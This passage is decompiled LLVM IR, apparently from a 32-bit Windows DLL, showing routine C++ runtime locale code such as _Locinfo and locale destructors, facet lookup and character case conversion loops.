  %41 = inttoptr i32 %40 to i32*, !insn.addr !117
  store i32 %eax.0.reload, i32* %41, align 4, !insn.addr !117
  %42 = add i32 %esp.0, -8, !insn.addr !118
  %43 = inttoptr i32 %42 to i32*, !insn.addr !118
  store i32 %2, i32* %43, align 4, !insn.addr !118
  %44 = call i32 @"?_Locinfo_ctor@_Locinfo@std@@SAXPAV12@PBD@Z"(i32* nonnull @4, i8* bitcast (i32* @4 to i8*)), !insn.addr !119
  %45 = load i32, i32* %stack_var_-16, align 4, !insn.addr !120
  call void @__writefsdword(i32 0, i32 %45), !insn.addr !121
  ret i32 %2, !insn.addr !122
}

define i32 @"??1_Locinfo@std@@QAE@XZ"() local_unnamed_addr {
dec_label_pc_10001410:
  %0 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %1 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !123
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !124
  store i32 %2, i32* %stack_var_-16, align 4, !insn.addr !125
  %3 = load i32, i32* @global_var_1003e084, align 4, !insn.addr !126
  %4 = xor i32 %3, %1, !insn.addr !127
  store i32 %4, i32* %stack_var_-24, align 4, !insn.addr !128
  %5 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !129
  call void @__writefsdword(i32 0, i32 %5), !insn.addr !130
  %6 = inttoptr i32 %0 to i32*, !insn.addr !131
  %7 = call i32 @"?_Locinfo_dtor@_Locinfo@std@@SAXPAV12@@Z"(i32* %6), !insn.addr !131
  %8 = add i32 %0, 44, !insn.addr !132
  %9 = inttoptr i32 %8 to i32*, !insn.addr !132
  %10 = load i32, i32* %9, align 4, !insn.addr !132
  %11 = icmp eq i32 %10, 0, !insn.addr !133
  br i1 %11, label %dec_label_pc_1000144e, label %dec_label_pc_10001445, !insn.addr !134

dec_label_pc_10001445:                            ; preds = %dec_label_pc_10001410
  %12 = call i32 @_free(), !insn.addr !135
  br label %dec_label_pc_1000144e, !insn.addr !136

dec_label_pc_1000144e:                            ; preds = %dec_label_pc_10001445, %dec_label_pc_10001410
  store i32 0, i32* %9, align 4, !insn.addr !137
  %13 = add i32 %0, 36, !insn.addr !138
  %14 = inttoptr i32 %13 to i32*, !insn.addr !138
  %15 = load i32, i32* %14, align 4, !insn.addr !138
  %16 = icmp eq i32 %15, 0, !insn.addr !139
  br i1 %16, label %dec_label_pc_10001465, label %dec_label_pc_1000145c, !insn.addr !140

dec_label_pc_1000145c:                            ; preds = %dec_label_pc_1000144e
  %17 = call i32 @_free(), !insn.addr !141
  br label %dec_label_pc_10001465, !insn.addr !142

dec_label_pc_10001465:                            ; preds = %dec_label_pc_1000145c, %dec_label_pc_1000144e
  store i32 0, i32* %14, align 4, !insn.addr !143
  %18 = add i32 %0, 28, !insn.addr !144
  %19 = inttoptr i32 %18 to i32*, !insn.addr !144
  %20 = load i32, i32* %19, align 4, !insn.addr !144
  %21 = icmp eq i32 %20, 0, !insn.addr !145
  br i1 %21, label %dec_label_pc_1000147c, label %dec_label_pc_10001473, !insn.addr !146

dec_label_pc_10001473:                            ; preds = %dec_label_pc_10001465
  %22 = call i32 @_free(), !insn.addr !147
  br label %dec_label_pc_1000147c, !insn.addr !148

dec_label_pc_1000147c:                            ; preds = %dec_label_pc_10001473, %dec_label_pc_10001465
  %23 = ptrtoint i32* %stack_var_-24 to i32, !insn.addr !149
  store i32 0, i32* %19, align 4, !insn.addr !150
  %24 = add i32 %0, 20, !insn.addr !151
  %25 = inttoptr i32 %24 to i32*, !insn.addr !151
  %26 = load i32, i32* %25, align 4, !insn.addr !151
  %27 = icmp eq i32 %26, 0, !insn.addr !152
  br i1 %27, label %dec_label_pc_10001493, label %dec_label_pc_1000148a, !insn.addr !153

dec_label_pc_1000148a:                            ; preds = %dec_label_pc_1000147c
  %28 = add i32 %23, -4, !insn.addr !154
  %29 = inttoptr i32 %28 to i32*, !insn.addr !154
  store i32 %26, i32* %29, align 4, !insn.addr !154
  %30 = call i32 @_free(), !insn.addr !155
  br label %dec_label_pc_10001493, !insn.addr !156

dec_label_pc_10001493:                            ; preds = %dec_label_pc_1000148a, %dec_label_pc_1000147c
  store i32 0, i32* %25, align 4, !insn.addr !157
  %31 = add i32 %0, 12, !insn.addr !158
  %32 = inttoptr i32 %31 to i32*, !insn.addr !158
  %33 = load i32, i32* %32, align 4, !insn.addr !158
  %34 = icmp eq i32 %33, 0, !insn.addr !159
  br i1 %34, label %dec_label_pc_100014aa, label %dec_label_pc_100014a1, !insn.addr !160

dec_label_pc_100014a1:                            ; preds = %dec_label_pc_10001493
  %35 = add i32 %23, -4, !insn.addr !161
  %36 = inttoptr i32 %35 to i32*, !insn.addr !161
  store i32 %33, i32* %36, align 4, !insn.addr !161
  %37 = call i32 @_free(), !insn.addr !162
  br label %dec_label_pc_100014aa, !insn.addr !163

dec_label_pc_100014aa:                            ; preds = %dec_label_pc_100014a1, %dec_label_pc_10001493
  store i32 0, i32* %32, align 4, !insn.addr !164
  %38 = add i32 %0, 4, !insn.addr !165
  %39 = inttoptr i32 %38 to i32*, !insn.addr !165
  %40 = load i32, i32* %39, align 4, !insn.addr !165
  %41 = icmp eq i32 %40, 0, !insn.addr !166
  br i1 %41, label %dec_label_pc_100014c1, label %dec_label_pc_100014b8, !insn.addr !167

dec_label_pc_100014b8:                            ; preds = %dec_label_pc_100014aa
  %42 = add i32 %23, -4, !insn.addr !168
  %43 = inttoptr i32 %42 to i32*, !insn.addr !168
  store i32 %40, i32* %43, align 4, !insn.addr !168
  %44 = call i32 @_free(), !insn.addr !169
  br label %dec_label_pc_100014c1, !insn.addr !170

dec_label_pc_100014c1:                            ; preds = %dec_label_pc_100014b8, %dec_label_pc_100014aa
  store i32 0, i32* %39, align 4, !insn.addr !171
  %45 = call i32 @"??1_Lockit@std@@QAE@XZ"(), !insn.addr !172
  %46 = load i32, i32* %stack_var_-16, align 4, !insn.addr !173
  call void @__writefsdword(i32 0, i32 %46), !insn.addr !174
  ret i32 %45, !insn.addr !175
}

define i32 @function_100014e0(i32 %arg1) local_unnamed_addr {
dec_label_pc_100014e0:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i128 @__decompiler_undefined_function_4()
  %2 = call i128 @__asm_xorps(i128 %1, i128 %1), !insn.addr !176
  %3 = add i32 %0, 4, !insn.addr !177
  %4 = inttoptr i32 %0 to i32*, !insn.addr !178
  store i32 ptrtoint (%vtable_1002d3b4_type* @global_var_1002d3b4 to i32), i32* %4, align 4, !insn.addr !178
  %5 = inttoptr i32 %3 to i64*, !insn.addr !179
  %6 = load i64, i64* %5, align 4, !insn.addr !179
  call void @__asm_movq.38(i64 %6, i128 %2), !insn.addr !179
  %7 = call i32 @___std_exception_copy(), !insn.addr !180
  store i32 ptrtoint (i32* @global_var_1002d3c0 to i32), i32* %4, align 4, !insn.addr !181
  ret i32 %0, !insn.addr !182
}

define i32 @function_10001520(i8 %arg1) local_unnamed_addr {
dec_label_pc_10001520:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = and i8 %arg1, 1, !insn.addr !183
  %2 = icmp eq i8 %1, 0, !insn.addr !183
  %3 = inttoptr i32 %0 to i32*, !insn.addr !184
  store i32 ptrtoint (i32* @global_var_1002d3d8 to i32), i32* %3, align 4, !insn.addr !184
  br i1 %2, label %dec_label_pc_1000153d, label %dec_label_pc_10001532, !insn.addr !185

dec_label_pc_10001532:                            ; preds = %dec_label_pc_10001520
  call void @"??3@YAXPAXI@Z"(i32* %3, i32 ptrtoint (i32* @4 to i32)), !insn.addr !186
  br label %dec_label_pc_1000153d, !insn.addr !187

dec_label_pc_1000153d:                            ; preds = %dec_label_pc_10001532, %dec_label_pc_10001520
  ret i32 %0, !insn.addr !188
}

define i32 @function_10001590() {
dec_label_pc_10001590:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__decompiler_undefined_function_1()
  %2 = add i32 %0, 4, !insn.addr !189
  %3 = inttoptr i32 %2 to i32*, !insn.addr !189
  %4 = load i32, i32* %3, align 4, !insn.addr !189
  %5 = add i32 %4, 1, !insn.addr !189
  store i32 %5, i32* %3, align 4, !insn.addr !189
  ret i32 %1, !insn.addr !190
}

define i32 @function_100015a0() {
dec_label_pc_100015a0:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = add i32 %0, 4, !insn.addr !191
  %2 = inttoptr i32 %1 to i32*, !insn.addr !191
  %3 = load i32, i32* %2, align 4, !insn.addr !191
  %4 = add i32 %3, -1, !insn.addr !191
  %5 = icmp eq i32 %4, 0, !insn.addr !191
  store i32 %4, i32* %2, align 4, !insn.addr !191
  %6 = select i1 %5, i32 %0, i32 0, !insn.addr !192
  ret i32 %6, !insn.addr !193
}

define i32 @function_100015c0() local_unnamed_addr {
dec_label_pc_100015c0:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__decompiler_undefined_function_1()
  %2 = inttoptr i32 %0 to i32*, !insn.addr !194
  store i32 ptrtoint (i32* @global_var_1002d3d8 to i32), i32* %2, align 4, !insn.addr !194
  ret i32 %1, !insn.addr !195
}

define i32 @"??1locale@std@@QAE@XZ"() local_unnamed_addr {
dec_label_pc_100015d0:
  %eax.0.reg2mem = alloca i32, !insn.addr !196
  %0 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-16 = alloca i32, align 4
  %1 = call i32 @__readfsdword(i32 0), !insn.addr !197
  store i32 %1, i32* %stack_var_-16, align 4, !insn.addr !198
  %2 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !199
  call void @__writefsdword(i32 0, i32 %2), !insn.addr !200
  %3 = add i32 %0, 4, !insn.addr !201
  %4 = inttoptr i32 %3 to i32*, !insn.addr !201
  %5 = load i32, i32* %4, align 4, !insn.addr !201
  %6 = icmp eq i32 %5, 0, !insn.addr !202
  store i32 %2, i32* %eax.0.reg2mem, !insn.addr !203
  br i1 %6, label %dec_label_pc_1000160a, label %dec_label_pc_100015f9, !insn.addr !203

dec_label_pc_100015f9:                            ; preds = %dec_label_pc_100015d0
  %7 = inttoptr i32 %5 to i32*, !insn.addr !204
  %8 = load i32, i32* %7, align 4, !insn.addr !204
  store i32 %8, i32* %eax.0.reg2mem
  br label %dec_label_pc_1000160a

dec_label_pc_1000160a:                            ; preds = %dec_label_pc_100015f9, %dec_label_pc_100015d0
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %9 = load i32, i32* %stack_var_-16, align 4, !insn.addr !205
  call void @__writefsdword(i32 0, i32 %9), !insn.addr !206
  ret i32 %eax.0.reload, !insn.addr !207
}

define i8* @"?c_str@locale@std@@QBEPBDXZ"() local_unnamed_addr {
dec_label_pc_10001620:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = add i32 %0, 4, !insn.addr !208
  %2 = inttoptr i32 %1 to i32*, !insn.addr !208
  %3 = load i32, i32* %2, align 4, !insn.addr !208
  %4 = icmp eq i32 %3, 0, !insn.addr !209
  %5 = icmp eq i1 %4, false, !insn.addr !210
  br i1 %5, label %dec_label_pc_1000162d, label %dec_label_pc_10001627, !insn.addr !210

dec_label_pc_10001627:                            ; preds = %dec_label_pc_10001620
  ret i8* bitcast (i8** @global_var_10039bf1 to i8*), !insn.addr !211

dec_label_pc_1000162d:                            ; preds = %dec_label_pc_10001620
  %6 = add i32 %3, 24, !insn.addr !212
  %7 = inttoptr i32 %6 to i32*, !insn.addr !212
  %8 = load i32, i32* %7, align 4, !insn.addr !212
  %9 = icmp eq i32 %8, 0, !insn.addr !213
  br i1 %9, label %dec_label_pc_10001637, label %dec_label_pc_10001634, !insn.addr !214

dec_label_pc_10001634:                            ; preds = %dec_label_pc_1000162d
  %10 = inttoptr i32 %8 to i8*, !insn.addr !215
  ret i8* %10, !insn.addr !215

dec_label_pc_10001637:                            ; preds = %dec_label_pc_1000162d
  %11 = add i32 %3, 28, !insn.addr !216
  %12 = inttoptr i32 %11 to i8*, !insn.addr !217
  ret i8* %12, !insn.addr !217
}

define i32* @"?_Getfacet@locale@std@@QBEPBVfacet@12@I@Z"(i32* %result, i32 %arg2) local_unnamed_addr {
dec_label_pc_10001640:
  %eax.1.reg2mem = alloca i32, !insn.addr !218
  %eax.0.reg2mem = alloca i32, !insn.addr !218
  %0 = ptrtoint i32* %result to i32
  %1 = add i32 %0, 4, !insn.addr !219
  %2 = inttoptr i32 %1 to i32*, !insn.addr !219
  %3 = load i32, i32* %2, align 4, !insn.addr !219
  %4 = add i32 %3, 12, !insn.addr !220
  %5 = inttoptr i32 %4 to i32*, !insn.addr !220
  %6 = load i32, i32* %5, align 4, !insn.addr !220
  %7 = icmp ugt i32 %6, %arg2, !insn.addr !220
  %8 = icmp eq i1 %7, false, !insn.addr !221
  store i32 0, i32* %eax.0.reg2mem, !insn.addr !221
  br i1 %8, label %dec_label_pc_1000165d, label %dec_label_pc_1000164f, !insn.addr !221

dec_label_pc_1000164f:                            ; preds = %dec_label_pc_10001640
  %9 = add i32 %3, 8, !insn.addr !222
  %10 = inttoptr i32 %9 to i32*, !insn.addr !222
  %11 = load i32, i32* %10, align 4, !insn.addr !222
  %12 = mul i32 %arg2, 4, !insn.addr !223
  %13 = add i32 %11, %12, !insn.addr !223
  %14 = inttoptr i32 %13 to i32*, !insn.addr !223
  %15 = load i32, i32* %14, align 4, !insn.addr !223
  %16 = icmp eq i32 %15, 0, !insn.addr !224
  %17 = icmp eq i1 %16, false, !insn.addr !225
  store i32 %15, i32* %eax.0.reg2mem, !insn.addr !225
  store i32 %15, i32* %eax.1.reg2mem, !insn.addr !225
  br i1 %17, label %dec_label_pc_1000167a, label %dec_label_pc_1000165d, !insn.addr !225

dec_label_pc_1000165d:                            ; preds = %dec_label_pc_10001640, %dec_label_pc_1000164f
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %18 = add i32 %3, 20, !insn.addr !226
  %19 = inttoptr i32 %18 to i8*, !insn.addr !226
  %20 = load i8, i8* %19, align 1, !insn.addr !226
  %21 = icmp eq i8 %20, 0, !insn.addr !226
  store i32 %eax.0.reload, i32* %eax.1.reg2mem, !insn.addr !227
  br i1 %21, label %dec_label_pc_1000167a, label %dec_label_pc_10001663, !insn.addr !227

dec_label_pc_10001663:                            ; preds = %dec_label_pc_1000165d
  %22 = call i32 @function_10010291(), !insn.addr !228
  %23 = add i32 %22, 12, !insn.addr !229
  %24 = inttoptr i32 %23 to i32*, !insn.addr !229
  %25 = load i32, i32* %24, align 4, !insn.addr !229
  %26 = icmp ugt i32 %25, %arg2, !insn.addr !229
  %27 = icmp eq i1 %26, false, !insn.addr !230
  store i32 0, i32* %eax.1.reg2mem, !insn.addr !230
  br i1 %27, label %dec_label_pc_1000167a, label %dec_label_pc_1000166d, !insn.addr !230

dec_label_pc_1000166d:                            ; preds = %dec_label_pc_10001663
  %28 = add i32 %22, 8, !insn.addr !231
  %29 = inttoptr i32 %28 to i32*, !insn.addr !231
  %30 = load i32, i32* %29, align 4, !insn.addr !231
  %31 = mul i32 %arg2, 4, !insn.addr !232
  %32 = add i32 %30, %31, !insn.addr !232
  %33 = inttoptr i32 %32 to i32*, !insn.addr !232
  %34 = load i32, i32* %33, align 4, !insn.addr !232
  %35 = inttoptr i32 %34 to i32*, !insn.addr !233
  ret i32* %35, !insn.addr !233

dec_label_pc_1000167a:                            ; preds = %dec_label_pc_10001663, %dec_label_pc_1000165d, %dec_label_pc_1000164f
  %eax.1.reload = load i32, i32* %eax.1.reg2mem
  %36 = inttoptr i32 %eax.1.reload to i32*, !insn.addr !234
  ret i32* %36, !insn.addr !234
}

define i32 @function_10001680(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10001680:
  %ecx.0.reg2mem = alloca i32, !insn.addr !235
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !236
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !237
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !238
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !239
  %2 = icmp eq i32 %arg1, 0, !insn.addr !240
  br i1 %2, label %dec_label_pc_1000171e, label %dec_label_pc_100016b5, !insn.addr !241

dec_label_pc_100016b5:                            ; preds = %dec_label_pc_10001680
  %3 = inttoptr i32 %arg1 to i32*, !insn.addr !242
  %4 = load i32, i32* %3, align 4, !insn.addr !242
  %5 = icmp eq i32 %4, 0, !insn.addr !242
  %6 = icmp eq i1 %5, false, !insn.addr !243
  br i1 %6, label %dec_label_pc_1000171e, label %dec_label_pc_100016ba, !insn.addr !243

dec_label_pc_100016ba:                            ; preds = %dec_label_pc_100016b5
  %7 = call i32 @"??2@YAPAXI@Z"(i32 24), !insn.addr !244
  %8 = add i32 %arg2, 4, !insn.addr !245
  %9 = inttoptr i32 %8 to i32*, !insn.addr !245
  %10 = load i32, i32* %9, align 4, !insn.addr !245
  %11 = icmp eq i32 %10, 0, !insn.addr !246
  %12 = icmp eq i1 %11, false, !insn.addr !247
  store i32 ptrtoint (i8** @global_var_10039bf1 to i32), i32* %ecx.0.reg2mem, !insn.addr !247
  br i1 %12, label %dec_label_pc_100016e1, label %dec_label_pc_100016eb, !insn.addr !247

dec_label_pc_100016e1:                            ; preds = %dec_label_pc_100016ba
  %13 = add i32 %10, 24, !insn.addr !248
  %14 = inttoptr i32 %13 to i32*, !insn.addr !248
  %15 = load i32, i32* %14, align 4, !insn.addr !248
  %16 = icmp eq i32 %15, 0, !insn.addr !249
  %17 = icmp eq i1 %16, false, !insn.addr !250
  %18 = add i32 %10, 28
  %spec.select = select i1 %17, i32 %15, i32 %18
  store i32 %spec.select, i32* %ecx.0.reg2mem
  br label %dec_label_pc_100016eb

dec_label_pc_100016eb:                            ; preds = %dec_label_pc_100016e1, %dec_label_pc_100016ba
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %19 = inttoptr i32 %ecx.0.reload to i8*, !insn.addr !251
  %20 = call i32 @"??0_Locinfo@std@@QAE@PBD@Z"(i32* nonnull %stack_var_-88, i8* %19), !insn.addr !252
  %21 = add i32 %7, 4, !insn.addr !253
  %22 = inttoptr i32 %21 to i32*, !insn.addr !253
  store i32 0, i32* %22, align 4, !insn.addr !253
  %23 = inttoptr i32 %7 to i32*, !insn.addr !254
  store i32 ptrtoint (i32* @global_var_1002d3e8 to i32), i32* %23, align 4, !insn.addr !254
  %24 = call i32 @__Getctype(i32* nonnull %stack_var_-36), !insn.addr !255
  %25 = inttoptr i32 %24 to i128*, !insn.addr !256
  %26 = load i128, i128* %25, align 4, !insn.addr !256
  %27 = call i128 @__asm_movups.42(i128 %26), !insn.addr !256
  %28 = add i32 %7, 8, !insn.addr !257
  %29 = inttoptr i32 %28 to i128*, !insn.addr !257
  %30 = load i128, i128* %29, align 4, !insn.addr !257
  call void @__asm_movups(i128 %30, i128 %27), !insn.addr !257
  store i32 %7, i32* %3, align 4, !insn.addr !258
  %31 = call i32 @"??1_Locinfo@std@@QAE@XZ"(), !insn.addr !259
  br label %dec_label_pc_1000171e, !insn.addr !259

dec_label_pc_1000171e:                            ; preds = %dec_label_pc_100016eb, %dec_label_pc_100016b5, %dec_label_pc_10001680
  %32 = load i32, i32* %stack_var_-16, align 4, !insn.addr !260
  call void @__writefsdword(i32 0, i32 %32), !insn.addr !261
  ret i32 2, !insn.addr !262
}

define i32 @function_10001740(i8 %arg1) local_unnamed_addr {
dec_label_pc_10001740:
  %0 = call i32 @__Tolower(), !insn.addr !263
  ret i32 %0, !insn.addr !264
}

define i32 @function_10001760(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10001760:
  %esi.1.reg2mem = alloca i32, !insn.addr !265
  %edi.0.reg2mem = alloca i32, !insn.addr !265
  %esi.0.reg2mem = alloca i32, !insn.addr !265
  %0 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-16 = alloca i32, align 4
  %1 = icmp ult i32 %arg2, %arg1
  %2 = select i1 %1, i32 %arg1, i32 %arg2
  %3 = sub i32 %2, %arg1
  %4 = icmp eq i32 %3, 0, !insn.addr !266
  store i32 %arg1, i32* %esi.1.reg2mem, !insn.addr !267
  br i1 %4, label %dec_label_pc_1000179a, label %dec_label_pc_1000177c, !insn.addr !267

dec_label_pc_1000177c:                            ; preds = %dec_label_pc_10001760
  %5 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !268
  %6 = add i32 %0, 8, !insn.addr !269
  %7 = add i32 %5, -4, !insn.addr !270
  %8 = inttoptr i32 %7 to i32*, !insn.addr !270
  %9 = add i32 %5, -8, !insn.addr !271
  %10 = inttoptr i32 %9 to i32*, !insn.addr !271
  store i32 %arg1, i32* %esi.0.reg2mem, !insn.addr !272
  store i32 0, i32* %edi.0.reg2mem, !insn.addr !272
  br label %dec_label_pc_10001782, !insn.addr !272

dec_label_pc_10001782:                            ; preds = %dec_label_pc_10001782, %dec_label_pc_1000177c
  %edi.0.reload = load i32, i32* %edi.0.reg2mem
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  store i32 %6, i32* %8, align 4, !insn.addr !270
  %11 = inttoptr i32 %esi.0.reload to i8*, !insn.addr !273
  %12 = load i8, i8* %11, align 1, !insn.addr !273
  %13 = zext i8 %12 to i32, !insn.addr !273
  store i32 %13, i32* %10, align 4, !insn.addr !271
  %14 = call i32 @__Tolower(), !insn.addr !274
  %15 = trunc i32 %14 to i8, !insn.addr !275
  store i8 %15, i8* %11, align 1, !insn.addr !275
  %16 = add i32 %edi.0.reload, 1, !insn.addr !276
  %17 = add i32 %esi.0.reload, 1, !insn.addr !277
  %18 = icmp eq i32 %16, %3, !insn.addr !278
  %19 = icmp eq i1 %18, false, !insn.addr !279
  store i32 %17, i32* %esi.0.reg2mem, !insn.addr !279
  store i32 %16, i32* %edi.0.reg2mem, !insn.addr !279
  store i32 %17, i32* %esi.1.reg2mem, !insn.addr !279
  br i1 %19, label %dec_label_pc_10001782, label %dec_label_pc_1000179a, !insn.addr !279

dec_label_pc_1000179a:                            ; preds = %dec_label_pc_10001782, %dec_label_pc_10001760
  %esi.1.reload = load i32, i32* %esi.1.reg2mem
  ret i32 %esi.1.reload, !insn.addr !280
}

define i32 @function_100017b0(i8 %arg1) local_unnamed_addr {
dec_label_pc_100017b0:
  %0 = call i32 @__Toupper(), !insn.addr !281
  ret i32 %0, !insn.addr !282
}

define i32 @function_100017d0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_100017d0:
  %esi.1.reg2mem = alloca i32, !insn.addr !283
  %edi.0.reg2mem = alloca i32, !insn.addr !283
  %esi.0.reg2mem = alloca i32, !insn.addr !283
  %0 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-16 = alloca i32, align 4
  %1 = icmp ult i32 %arg2, %arg1
  %2 = select i1 %1, i32 %arg1, i32 %arg2
  %3 = sub i32 %2, %arg1
  %4 = icmp eq i32 %3, 0, !insn.addr !284
  store i32 %arg1, i32* %esi.1.reg2mem, !insn.addr !285
  br i1 %4, label %dec_label_pc_1000180a, label %dec_label_pc_100017ec, !insn.addr !285

dec_label_pc_100017ec:                            ; preds = %dec_label_pc_100017d0
  %5 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !286
  %6 = add i32 %0, 8, !insn.addr !287
  %7 = add i32 %5, -4, !insn.addr !288
  %8 = inttoptr i32 %7 to i32*, !insn.addr !288
  %9 = add i32 %5, -8, !insn.addr !289
  %10 = inttoptr i32 %9 to i32*, !insn.addr !289
  store i32 %arg1, i32* %esi.0.reg2mem, !insn.addr !290
  store i32 0, i32* %edi.0.reg2mem, !insn.addr !290
  br label %dec_label_pc_100017f2, !insn.addr !290

dec_label_pc_100017f2:                            ; preds = %dec_label_pc_100017f2, %dec_label_pc_100017ec
  %edi.0.reload = load i32, i32* %edi.0.reg2mem
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  store i32 %6, i32* %8, align 4, !insn.addr !288
  %11 = inttoptr i32 %esi.0.reload to i8*, !insn.addr !291
  %12 = load i8, i8* %11, align 1, !insn.addr !291
  %13 = zext i8 %12 to i32, !insn.addr !291
  store i32 %13, i32* %10, align 4, !insn.addr !289
  %14 = call i32 @__Toupper(), !insn.addr !292
  %15 = trunc i32 %14 to i8, !insn.addr !293
  store i8 %15, i8* %11, align 1, !insn.addr !293
  %16 = add i32 %edi.0.reload, 1, !insn.addr !294
  %17 = add i32 %esi.0.reload, 1, !insn.addr !295
  %18 = icmp eq i32 %16, %3, !insn.addr !296
  %19 = icmp eq i1 %18, false, !insn.addr !297
  store i32 %17, i32* %esi.0.reg2mem, !insn.addr !297
  store i32 %16, i32* %edi.0.reg2mem, !insn.addr !297
  store i32 %17, i32* %esi.1.reg2mem, !insn.addr !297
  br i1 %19, label %dec_label_pc_100017f2, label %dec_label_pc_1000180a, !insn.addr !297

dec_label_pc_1000180a:                            ; preds = %dec_label_pc_100017f2, %dec_label_pc_100017d0
  %esi.1.reload = load i32, i32* %esi.1.reg2mem
  ret i32 %esi.1.reload, !insn.addr !298
}

define i32 @function_10001820(i8 %arg1) local_unnamed_addr {
dec_label_pc_10001820:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = zext i8 %arg1 to i32, !insn.addr !299
  %2 = and i32 %0, -256, !insn.addr !299
  %3 = or i32 %2, %1, !insn.addr !299
  ret i32 %3, !insn.addr !300
}

define i32 @function_10001830(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10001830:
  %0 = call i32 @_memcpy.11(), !insn.addr !301
  ret i32 %arg2, !insn.addr !302
}

define i32 @function_10001850(i8 %arg1) local_unnamed_addr {
dec_label_pc_10001850:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = zext i8 %arg1 to i32, !insn.addr !303
  %2 = and i32 %0, -256, !insn.addr !303
  %3 = or i32 %2, %1, !insn.addr !303
  ret i32 %3, !insn.addr !304
}

define i32 @function_10001860(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10001860:
  %0 = call i32 @_memcpy.11(), !insn.addr !305
  ret i32 %arg2, !insn.addr !306
}

define i32 @function_10001880(i8 %arg1) local_unnamed_addr {
dec_label_pc_10001880:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = add i32 %0, 16, !insn.addr !307
  %2 = inttoptr i32 %1 to i32*, !insn.addr !307
  %3 = load i32, i32* %2, align 4, !insn.addr !307
  %4 = inttoptr i32 %0 to i32*, !insn.addr !308
  store i32 ptrtoint (i32* @global_var_1002d3e8 to i32), i32* %4, align 4, !insn.addr !308
  %5 = icmp slt i32 %3, 1
  br i1 %5, label %dec_label_pc_1000189d, label %dec_label_pc_10001893, !insn.addr !309

dec_label_pc_10001893:                            ; preds = %dec_label_pc_10001880
  %6 = call i32 @_free(), !insn.addr !310
  br label %dec_label_pc_100018aa, !insn.addr !311

dec_label_pc_1000189d:                            ; preds = %dec_label_pc_10001880
  %7 = icmp ne i32 %3, 0, !insn.addr !312
  %8 = icmp eq i1 %7, false, !insn.addr !313
  br i1 %8, label %dec_label_pc_100018aa, label %dec_label_pc_1000189f, !insn.addr !313

dec_label_pc_1000189f:                            ; preds = %dec_label_pc_1000189d
  %9 = call i32 @function_10011666(), !insn.addr !314
  br label %dec_label_pc_100018aa, !insn.addr !314

dec_label_pc_100018aa:                            ; preds = %dec_label_pc_10001893, %dec_label_pc_1000189f, %dec_label_pc_1000189d
  %10 = call i32 @_free(), !insn.addr !315
  store i32 ptrtoint (i32* @global_var_1002d3d8 to i32), i32* %4, align 4, !insn.addr !316
  %11 = and i8 %arg1, 1, !insn.addr !317
  %12 = icmp eq i8 %11, 0, !insn.addr !317
  br i1 %12, label %dec_label_pc_100018cc, label %dec_label_pc_100018c1, !insn.addr !318

dec_label_pc_100018c1:                            ; preds = %dec_label_pc_100018aa
  call void @"??3@YAXPAXI@Z"(i32* nonnull %4, i32 ptrtoint (i32* @4 to i32)), !insn.addr !319
  br label %dec_label_pc_100018cc, !insn.addr !320

dec_label_pc_100018cc:                            ; preds = %dec_label_pc_100018c1, %dec_label_pc_100018aa
  ret i32 %0, !insn.addr !321
}

define i32 @function_100018e0(i8 %arg1) {
dec_label_pc_100018e0:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = and i8 %arg1, 1, !insn.addr !322
  %2 = icmp eq i8 %1, 0, !insn.addr !322
  %3 = inttoptr i32 %0 to i32*, !insn.addr !323
  store i32 ptrtoint (i32* @global_var_1002d418 to i32), i32* %3, align 4, !insn.addr !323
  br i1 %2, label %dec_label_pc_100018fd, label %dec_label_pc_100018f2, !insn.addr !324

dec_label_pc_100018f2:                            ; preds = %dec_label_pc_100018e0
  call void @"??3@YAXPAXI@Z"(i32* %3, i32 ptrtoint (i32* @4 to i32)), !insn.addr !325
  br label %dec_label_pc_100018fd, !insn.addr !326

dec_label_pc_100018fd:                            ; preds = %dec_label_pc_100018f2, %dec_label_pc_100018e0
  ret i32 %0, !insn.addr !327
}

define i32 @function_10001910(i32 %arg1) local_unnamed_addr {
dec_label_pc_10001910:
  ret i32 %arg1, !insn.addr !328
}

define i32 @function_10001940(i32 %arg1, i32 %arg2) {
dec_label_pc_10001940:
  %0 = inttoptr i32 %arg1 to i32*, !insn.addr !329
  store i32 %arg2, i32* %0, align 4, !insn.addr !329
  %1 = add i32 %arg1, 4, !insn.addr !330
  %2 = inttoptr i32 %1 to i32*, !insn.addr !330
  ret i32 %arg1, !insn.addr !331
}

define i32 @function_10001960(i32 %arg1, i32 %arg2) {
dec_label_pc_10001960:
  %eax.0.reg2mem = alloca i32, !insn.addr !332
